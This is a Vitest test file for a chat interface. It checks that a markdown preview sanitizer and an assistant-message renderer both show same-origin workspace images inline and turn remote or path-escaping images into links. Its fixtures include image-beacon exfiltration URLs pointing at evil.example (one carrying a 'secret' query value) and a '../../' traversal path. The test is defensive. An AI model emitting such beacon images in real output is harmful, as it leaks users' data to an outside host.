import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { ChatMessageCard, sameOriginImage } from "@abstractframework/panel-chat";
import { safeMarkdownImages } from "./session_files";

// The Files preview (safeMarkdownImages) and panel-chat's assistant-message
// rule (sameOriginImage, images="link") must agree: the workspace content
// route is root-relative, so it renders inline in both; remote images are
// links in both.
describe("image policy: Files preview and chat agree", () => {
  const md = [
    "![plot](figs/plot.png)",
    "![beacon](https://evil.example/t.gif?d=secret)",
    "![pix](//evil.example/p.png)",
    "![up](../../escape.png)",
  ].join("\n");
  const safe = safeMarkdownImages(md, "r1", "docs/README.md");
  const workspaceUrl = "/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png";

  it("the workspace content route is inline for panel-chat too", () => {
    expect(safe).toContain(`![plot](${workspaceUrl})`);
    expect(sameOriginImage(workspaceUrl)).toBe(true);
  });

  it("every image the preview turns into a link is refused by panel-chat too", () => {
    for (const src of ["https://evil.example/t.gif?d=secret", "//evil.example/p.png", "../../escape.png"]) {
      expect(safe).toMatch(new RegExp(`(^|[^!])\\[image: [^\\]]*\\]\\(${src.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&")}\\)`, "m"));
      expect(sameOriginImage(src)).toBe(false);
    }
  });

  it("an assistant message shows the workspace image inline and a remote one as a link", () => {
    const html = renderToStaticMarkup(
      <ChatMessageCard
        message={{
          id: "a1",
          role: "assistant",
          content: `![plot](${workspaceUrl})\n\n![beacon](https://evil.example/t.gif)`,
        }}
      />,
    );
    expect(html).toMatch(/<img[^>]+src="\/api\/gateway\/runs\/r1\/workspace\/content\?path=docs%2Ffigs%2Fplot\.png"/);
    expect(html).not.toMatch(/<img[^>]+evil\.example/);
    expect(html).toContain("image: beacon");
  });
});
